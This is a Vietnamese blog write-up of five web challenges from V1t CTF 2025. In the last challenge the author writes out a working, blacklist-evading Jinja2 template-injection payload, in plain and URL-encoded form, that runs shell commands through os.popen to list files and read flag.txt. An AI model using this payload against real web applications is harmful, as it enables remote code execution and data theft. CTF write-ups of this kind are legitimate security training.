@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Login PanelLink challenge: https:&#x2F;&#x2F;tommytheduck.github.io&#x2F;login&#x2F;   Khi truy cập, người dùng cần đăng nhập với username và password   Thử inspect source để xem source HTML thấy có username và password">
+<meta property="og:type" content="article">
+<meta property="og:title" content="V1t CTF 2025 [WEB]">
+<meta property="og:url" content="https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/index.html">
+<meta property="og:site_name" content="haonika&#39;s blog">
+<meta property="og:description" content="Login PanelLink challenge: https:&#x2F;&#x2F;tommytheduck.github.io&#x2F;login&#x2F;   Khi truy cập, người dùng cần đăng nhập với username và password   Thử inspect source để xem source HTML thấy có username và password">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/1.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/2.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/3.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/4.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/5.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/6.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/7.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/9.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/8.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/10.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/11.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/13.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/12.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/18.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/14.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/15.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/16.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/17.png">
+<meta property="og:image" content="https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/19.png">
+<meta property="article:published_time" content="2025-10-31T17:50:21.000Z">
+<meta property="article:modified_time" content="2025-11-01T15:57:42.494Z">
+<meta property="article:author" content="Duong Quang Hao">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>V1t CTF 2025 [WEB]</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Blogs</a></li><!--
+     --><!--
+       --><li><a href="/story/">Story</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/10/05/securinets-ctf-quals-2025/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/&text=V1t CTF 2025 [WEB]"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/&title=V1t CTF 2025 [WEB]"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/&is_video=false&description=V1t CTF 2025 [WEB]"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=V1t CTF 2025 [WEB]&body=Check out this article: https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/&title=V1t CTF 2025 [WEB]"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/&title=V1t CTF 2025 [WEB]"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/&title=V1t CTF 2025 [WEB]"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/&title=V1t CTF 2025 [WEB]"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/&name=V1t CTF 2025 [WEB]&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/&t=V1t CTF 2025 [WEB]"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Login-Panel"><span class="toc-number">1.</span> <span class="toc-text">Login Panel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stylish-Flag"><span class="toc-number">2.</span> <span class="toc-text">Stylish Flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tiny-Flag"><span class="toc-number">3.</span> <span class="toc-text">Tiny Flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mark-The-Lyrics"><span class="toc-number">4.</span> <span class="toc-text">Mark The Lyrics</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5571"><span class="toc-number">5.</span> <span class="toc-text">5571</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        V1t CTF 2025 [WEB]
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Duong Quang Hao</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-10-31T17:50:21.000Z" class="dt-published" itemprop="datePublished">2025-11-01</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/ctf/" rel="tag">ctf</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Login-Panel"><a href="#Login-Panel" class="headerlink" title="Login Panel"></a>Login Panel</h2><p>Link challenge: <a target="_blank" rel="noopener" href="https://tommytheduck.github.io/login/">https://tommytheduck.github.io/login/</a></p>
+<img src="/2025/11/01/v1t_ctf_2025/1.png" class="">
+
+<p>Khi truy cập, người dùng cần đăng nhập với <code>username</code> và <code>password</code></p>
+<img src="/2025/11/01/v1t_ctf_2025/2.png" class="">
+
+<p>Thử inspect source để xem source HTML thấy có <code>username</code> và <code>password</code> sẵn ở dạng <code>SHA256</code></p>
+<img src="/2025/11/01/v1t_ctf_2025/3.png" class="">
+
+<p>Khi người dùng nhập username và password, 2 dữ liệu này được mã hóa SHA256 và chuyển qua dạng hex, sau đó so sánh với <code>username</code> và <code>password</code> hardcode dạng <code>SHA256</code>. Nếu đúng thì <code>alert(username+ &#39;&#123;&#39;+password+&#39;&#125;&#39;)</code>.</p>
+<p>Sử dụng <code>crackstation.net</code> để tìm ra username, password plain text</p>
+<img src="/2025/11/01/v1t_ctf_2025/4.png" class="">
+
+<img src="/2025/11/01/v1t_ctf_2025/5.png" class="">
+
+<p>&#x3D;&gt; Flag: <code>v1t&#123;p4ssw0rd&#125;</code></p>
+<h2 id="Stylish-Flag"><a href="#Stylish-Flag" class="headerlink" title="Stylish Flag"></a>Stylish Flag</h2><p>Link challenge: <a target="_blank" rel="noopener" href="https://tommytheduck.github.io/stylish_flag/">https://tommytheduck.github.io/stylish_flag/</a></p>
+<img src="/2025/11/01/v1t_ctf_2025/6.png" class="">
+
+<p>Chall này vẽ flag bằng pixel art trong CSS.</p>
+<img src="/2025/11/01/v1t_ctf_2025/7.png" class="">
+
+<p>Ta chỉ cần chỉnh lại chút HTML và CSS để hiện flag. Ở đây mình xóa thẻ <code>h1</code> và thuộc tính <code>hidden</code></p>
+<img src="/2025/11/01/v1t_ctf_2025/9.png" class="">
+
+<p>Ở CSS, tại class <code>.flag</code> xóa tranform và chỉnh <code>opacity: 1</code>. Sau đó ở thẻ <code>body</code> chỉnh <code>justify-content: left</code>.</p>
+<p>Kết quả</p>
+<img src="/2025/11/01/v1t_ctf_2025/8.png" class="">
+
+<p>&#x3D;&gt; Flag: <code>v1t&#123;h1d30ut_css&#125;</code></p>
+<h2 id="Tiny-Flag"><a href="#Tiny-Flag" class="headerlink" title="Tiny Flag"></a>Tiny Flag</h2><p>Link challenge: <a target="_blank" rel="noopener" href="https://tommytheduck.github.io/tiny_flag/">https://tommytheduck.github.io/tiny_flag/</a></p>
+<img src="/2025/11/01/v1t_ctf_2025/10.png" class="">
+
+<p>Để ý source HTML khi inspect có icon <code>favicon.ico</code></p>
+<img src="/2025/11/01/v1t_ctf_2025/11.png" class="">
+
+<p>Flag nằm trong icon này luôn: <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/tommytheduck/tiny_flag/refs/heads/main/favicon.ico">https://raw.githubusercontent.com/tommytheduck/tiny_flag/refs/heads/main/favicon.ico</a></p>
+<p>Flag: <code>v1t&#123;t1ny_ico&#125;</code></p>
+<h2 id="Mark-The-Lyrics"><a href="#Mark-The-Lyrics" class="headerlink" title="Mark The Lyrics"></a>Mark The Lyrics</h2><p>Link challenge: <a target="_blank" rel="noopener" href="https://tommytheduck.github.io/mckey/">https://tommytheduck.github.io/mckey/</a></p>
+<img src="/2025/11/01/v1t_ctf_2025/13.png" class="">
+
+<p>Từng phần của flag được bọc trong thẻ <code>mark</code>, chỉ cần lấy theo thứ tự, sau đó ghép thành flag</p>
+<img src="/2025/11/01/v1t_ctf_2025/12.png" class="">
+
+<p>&#x3D;&gt; Flag: <code>V1T&#123;MCK-pap-cool-ooh-yeah&#125;</code></p>
+<h2 id="5571"><a href="#5571" class="headerlink" title="5571"></a>5571</h2><p>Link challenge: <a target="_blank" rel="noopener" href="http://chall.v1t.site:30300/">http://chall.v1t.site:30300/</a></p>
+<img src="/2025/11/01/v1t_ctf_2025/18.png" class="">
+
+<p>Bày này có lỗ hổng SSTI ở chức năng note mặc dù đã có filter</p>
+<img src="/2025/11/01/v1t_ctf_2025/14.png" class="">
+
+<p>Thử payload <code>%7B%7B7%2A7%7D%7D</code> (URL encode của 49) ra <code>49</code></p>
+<img src="/2025/11/01/v1t_ctf_2025/15.png" class="">
+
+<p>Vậy là sử dụng URL encode sẽ bypass được filter <code>&#123;</code>, <code>&#125;</code>. Bây giờ cần tạo payload bypass các từ khóa trong blacklist.</p>
+<p>Sử dụng <code>Fenjing-Legacy</code>: <a target="_blank" rel="noopener" href="https://github.com/Marven11/FenJing-Legacy/tree/main">https://github.com/Marven11/FenJing-Legacy/tree/main</a></p>
+<p>Clone về và chạy <code>example.py</code>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ssti <span class="keyword">import</span> shell_cmd</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">logging.basicConfig(level = logging.WARNING)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s: <span class="built_in">str</span></span>):</span><br><span class="line">    blacklist = [</span><br><span class="line">             <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;locals&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>, <span class="string">&#x27;setattr&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;inspect&#x27;</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> word <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">payload = shell_cmd(waf, <span class="string">&quot;ls /&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/11/01/v1t_ctf_2025/16.png" class="">
+
+<p>Lấy được payload, nhưng payload này không execute được theo như hình trên do bị blacklist, giờ chỉ cần chỉnh lại payload để thực thi được là được.</p>
+<p>Payload mới:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set x=((lipsum[(&#x27;_&#x27;+&#x27;_&#x27;+&#x27;g&#x27;+&#x27;l&#x27;+&#x27;o&#x27;+&#x27;b&#x27;+&#x27;a&#x27;+&#x27;l&#x27;+&#x27;s&#x27;+&#x27;_&#x27;+&#x27;_&#x27;)][(&#x27;_&#x27;+&#x27;_&#x27;+&#x27;b&#x27;+&#x27;u&#x27;+&#x27;i&#x27;+&#x27;l&#x27;+&#x27;t&#x27;+&#x27;i&#x27;+&#x27;n&#x27;+&#x27;s&#x27;+&#x27;_&#x27;+&#x27;_&#x27;)][(&#x27;e&#x27;+&#x27;v&#x27;+&#x27;a&#x27;+&#x27;l&#x27;)]))((&#x27;_&#x27;+&#x27;_&#x27;+&#x27;i&#x27;+&#x27;m&#x27;+&#x27;p&#x27;+&#x27;o&#x27;+&#x27;r&#x27;+&#x27;t&#x27;+&#x27;_&#x27;+&#x27;_&#x27;+&#x27;(&#x27;+&#x27;\&#x27;&#x27;+&#x27;o&#x27;+&#x27;s&#x27;+&#x27;\&#x27;&#x27;+&#x27;)&#x27;+&#x27;.&#x27;+&#x27;p&#x27;+&#x27;o&#x27;+&#x27;p&#x27;+&#x27;e&#x27;+&#x27;n&#x27;+&#x27;(&#x27;+&#x27;\&#x27;&#x27;+&#x27;l&#x27;+&#x27;s&#x27;+&#x27; &#x27;+&#x27;/&#x27;+&#x27;\&#x27;&#x27;+&#x27;)&#x27;+&#x27;.&#x27;+&#x27;r&#x27;+&#x27;e&#x27;+&#x27;a&#x27;+&#x27;d&#x27;+&#x27;(&#x27;+&#x27;)&#x27;)) %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Sau đó URL encode payload này render thôi</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%7B%25%20set%20x%3D%28%28lipsum%5B%28%27_%27%2B%27_%27%2B%27g%27%2B%27l%27%2B%27o%27%2B%27b%27%2B%27a%27%2B%27l%27%2B%27s%27%2B%27_%27%2B%27_%27%29%5D%5B%28%27_%27%2B%27_%27%2B%27b%27%2B%27u%27%2B%27i%27%2B%27l%27%2B%27t%27%2B%27i%27%2B%27n%27%2B%27s%27%2B%27_%27%2B%27_%27%29%5D%5B%28%27e%27%2B%27v%27%2B%27a%27%2B%27l%27%29%5D%29%29%28%28%27_%27%2B%27_%27%2B%27i%27%2B%27m%27%2B%27p%27%2B%27o%27%2B%27r%27%2B%27t%27%2B%27_%27%2B%27_%27%2B%27%28%27%2B%27%5C%27%27%2B%27o%27%2B%27s%27%2B%27%5C%27%27%2B%27%29%27%2B%27.%27%2B%27p%27%2B%27o%27%2B%27p%27%2B%27e%27%2B%27n%27%2B%27%28%27%2B%27%5C%27%27%2B%27l%27%2B%27s%27%2B%27%5C%27%27%2B%27%29%27%2B%27.%27%2B%27r%27%2B%27e%27%2B%27a%27%2B%27d%27%2B%27%28%27%2B%27%29%27%29%29%20%25%7D%7B%7B%20x%20%7D%7D</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/11/01/v1t_ctf_2025/17.png" class="">
+
+<p>Đọc file <code>flag.txt</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set x=((lipsum[(&#x27;_&#x27;+&#x27;_&#x27;+&#x27;g&#x27;+&#x27;l&#x27;+&#x27;o&#x27;+&#x27;b&#x27;+&#x27;a&#x27;+&#x27;l&#x27;+&#x27;s&#x27;+&#x27;_&#x27;+&#x27;_&#x27;)][(&#x27;_&#x27;+&#x27;_&#x27;+&#x27;b&#x27;+&#x27;u&#x27;+&#x27;i&#x27;+&#x27;l&#x27;+&#x27;t&#x27;+&#x27;i&#x27;+&#x27;n&#x27;+&#x27;s&#x27;+&#x27;_&#x27;+&#x27;_&#x27;)][(&#x27;e&#x27;+&#x27;v&#x27;+&#x27;a&#x27;+&#x27;l&#x27;)]))((&#x27;_&#x27;+&#x27;_&#x27;+&#x27;i&#x27;+&#x27;m&#x27;+&#x27;p&#x27;+&#x27;o&#x27;+&#x27;r&#x27;+&#x27;t&#x27;+&#x27;_&#x27;+&#x27;_&#x27;+&#x27;(&#x27;+&#x27;\&#x27;&#x27;+&#x27;o&#x27;+&#x27;s&#x27;+&#x27;\&#x27;&#x27;+&#x27;)&#x27;+&#x27;.&#x27;+&#x27;p&#x27;+&#x27;o&#x27;+&#x27;p&#x27;+&#x27;e&#x27;+&#x27;n&#x27;+&#x27;(&#x27;+&#x27;\&#x27;&#x27;+&#x27;c&#x27;+&#x27;a&#x27;+&#x27;t&#x27;+&#x27; &#x27;+&#x27;f&#x27;+&#x27;l&#x27;+&#x27;a&#x27;+&#x27;g&#x27;+&#x27;.&#x27;+&#x27;t&#x27;+&#x27;x&#x27;+&#x27;t&#x27;+&#x27;\&#x27;&#x27;+&#x27;)&#x27;+&#x27;.&#x27;+&#x27;r&#x27;+&#x27;e&#x27;+&#x27;a&#x27;+&#x27;d&#x27;+&#x27;(&#x27;+&#x27;)&#x27;)) %&#125;&#123;&#123; x &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/11/01/v1t_ctf_2025/19.png" class="">
+
+<p>&#x3D;&gt; Flag: <code>v1t&#123;n0th1ng_b34ts_url_ssti_9cfac8e6b8978e3f6037d9608fed7767&#125;</code></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Blogs</a></li>
+        
+          <li><a href="/story/">Story</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Login-Panel"><span class="toc-number">1.</span> <span class="toc-text">Login Panel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stylish-Flag"><span class="toc-number">2.</span> <span class="toc-text">Stylish Flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tiny-Flag"><span class="toc-number">3.</span> <span class="toc-text">Tiny Flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mark-The-Lyrics"><span class="toc-number">4.</span> <span class="toc-text">Mark The Lyrics</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5571"><span class="toc-number">5.</span> <span class="toc-text">5571</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/&text=V1t CTF 2025 [WEB]"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/&title=V1t CTF 2025 [WEB]"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/&is_video=false&description=V1t CTF 2025 [WEB]"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=V1t CTF 2025 [WEB]&body=Check out this article: https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/&title=V1t CTF 2025 [WEB]"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/&title=V1t CTF 2025 [WEB]"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/&title=V1t CTF 2025 [WEB]"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/&title=V1t CTF 2025 [WEB]"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/&name=V1t CTF 2025 [WEB]&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://duonghaonika.github.io/2025/11/01/v1t_ctf_2025/&t=V1t CTF 2025 [WEB]"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2025
+    Duong Quang Hao
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Blogs</a></li><!--
+     --><!--
+       --><li><a href="/story/">Story</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
